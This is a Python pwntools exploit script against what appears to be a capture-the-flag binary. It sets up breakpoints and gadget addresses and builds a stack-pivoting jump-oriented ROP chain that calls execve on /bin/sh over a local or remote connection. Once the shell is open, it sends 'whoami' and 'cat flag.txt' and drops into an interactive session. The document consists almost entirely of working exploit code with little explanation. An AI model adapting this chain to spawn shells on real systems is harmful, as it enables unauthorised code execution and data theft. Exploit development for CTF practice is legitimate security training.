#!/usr/bin/python3.7

from pwn import *
import tty

os.chdir('../public')
elf = context.binary = ELF("pwn")
libc = elf.libc
context.terminal = ['tilix', '-a', 'app-new-session', '-e']
gs = '''
init-pwndbg
b *0x400137
b *0x400162
c
'''

LHOST = 'localhost'
PORT = 3337


def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        if args.LHOST:
            return remote(LHOST, PORT)
        return remote(args.HOST, PORT)
    else:
        return process(elf.path)


r = run()

# =-=-=-= GADGETS -=-=-=-
MESSAGE = 0x60017c  # buffer
# pop rsp ; pop rcx ; jmp rcx # 1
POP_RSP_RCX_JMP_RCX = 0x40016c
# pop r13 ; pop r12 ; pop rcx ; jmp rcx #2  , # 4
POP_R13_R12_RCX_JMP_RCX = 0x400169
# mov rbx, r12 ; jmp r13  # 3
MOV_RBX_R12_JMP_R13 = 0x400170
# lea rsi, [rbp - 0x60] ; lea rdi, [0x60017c] ; jmp r13
LEA_RDI = 0x40011c
# xchg rax, rbx ; jmp r12   # 6
XCHG_RAX_RBX_JMP_R12 = 0x400176
# mov edx, 0 ; syscall
SYSCALL = 0x400162  # execve: RAX = '0x3b, RDI= ptr to /bin/sh, RSI =0, RDX = 0
BINSH = MESSAGE

OFFSET = 104  # cyclic_find(0x616161616161616e, n=8)
payload = ['/bin/sh\x00',
           p64(0x702d),                   # '-p'
           p64(POP_R13_R12_RCX_JMP_RCX),  # pivot , rcx
           p64(POP_R13_R12_RCX_JMP_RCX),  # r13
           p64(0x3b),                     # r12 => rbx => rax
           p64(MOV_RBX_R12_JMP_R13),      # rcx
           p64(XCHG_RAX_RBX_JMP_R12),     # r13 
           p64(SYSCALL),                  # r12
           p64(LEA_RDI),                  # rcx
           p64(MESSAGE),                               
           p64(MESSAGE + 8),
           p64(0)
          ]
payload = flat(payload)

payload += b'A' * (OFFSET - len(payload) - 8)
payload += p64(MESSAGE + 0x60 + 0x48)  # RBP, RSI
payload += p64(POP_RSP_RCX_JMP_RCX)
payload += p64(MESSAGE + 16)  # RSP

r.sendline(payload)
r.sendline('whoami')
r.sendline('cat flag.txt && echo')
r.interactive()
